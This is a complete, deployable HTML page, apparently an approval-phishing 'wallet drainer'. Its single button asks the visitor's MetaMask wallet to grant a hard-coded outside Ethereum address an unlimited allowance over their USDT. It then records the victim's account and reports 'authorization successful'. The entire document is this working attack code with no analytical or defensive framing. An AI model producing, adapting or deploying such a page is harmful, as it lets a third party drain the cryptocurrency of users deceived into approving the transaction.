
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>授權頁面</title>
</head>
<body>
  <h2>授權 USDT（Ethereum 主網）</h2>
  <button onclick="approve()">授權最大金額</button>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <script>
    const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Mainnet USDT
    const spender = "0xFbe9c4748A267562f723C67db673943F901533D6";

    async function approve() {
      if (!window.ethereum) return alert("請安裝 MetaMask");
      const web3 = new Web3(window.ethereum);
      await window.ethereum.enable();

      const accounts = await web3.eth.getAccounts();
      const account = accounts[0];
      const abi = [{ "name": "approve", "type": "function", "inputs": [
        { "type": "address", "name": "spender" },
        { "type": "uint256", "name": "value" }
      ], "outputs": [{ "type": "bool", "name": "" }], "constant": false }];
      const contract = new web3.eth.Contract(abi, tokenAddress);
      const max = web3.utils.toTwosComplement(-1);
      await contract.methods.approve(spender, max).send({ from: account });

      // 儲存到 localStorage
      let history = JSON.parse(localStorage.getItem("history") || "[]");
      if (!history.includes(account)) {
        history.push(account);
        localStorage.setItem("history", JSON.stringify(history));
      }

      alert("授權成功！");
    }
  </script>
</body>
</html>
